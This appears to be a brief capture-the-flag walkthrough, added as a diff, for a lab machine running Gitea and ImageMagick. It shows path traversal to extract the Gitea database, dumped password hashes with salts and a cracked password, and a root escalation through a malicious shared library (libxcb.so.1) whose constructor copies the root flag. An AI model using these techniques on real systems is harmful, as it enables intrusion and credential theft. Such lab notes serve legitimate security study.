@@ -1,0 +1,56 @@
+immediate find path traversal
+
+user flag readble by that.
+
+found vhost dev.
+
+on the docker file there is the mapping of the DATA folder, so you can extract the db file on the usual folder home/developer/gitea/data/gitea/gitea.db with the path traversal
+
+sqlite> select name,passwd,passwd_hash_algo,rands,salt from user;
+
+administrator|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50|70a5bd0c1a5d23caa49030172cdcabdc|2d149e5fbd1b20cf31db3e3c6a28fc9b
+
+developer|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|0ce6f07fc9b557bc070fa7bef76a0d15|8bf3e3452b78544f8bee9400d6936d34
+
+cracking the hashes by seraching online the hashing algo, and replicating the process using a wordlist i found:
+
+developer: 25282528
+
+
+root:
+════════╣ PATH
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                             
+/home/developer/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+seems a rabbit hole
+
+there is a file in app/static/assets/images/metadata.log that's been modified in the last 5 min so you can think there is some sort of job
+
+searching for root executable file you find /opt/scripts/identify_images.sh
+
+
+cd /opt/app/static/assets/images
+truncate -s 0 metadata.log
+find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
+
+https://github.com/voidz0r/CVE-2022-44268
+git clone https://github.com/voidz0r/CVE-2022-44268
+
+gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
+
+#include <stdio.h>
+
+#include <stdlib.h>
+
+#include <unistd.h>
+
+ 
+
+__attribute__((constructor)) void init(){
+
+    system("cat /root/root.txt > /tmp/rootflag");
+
+    exit(0);
+
+}
+
+EOF
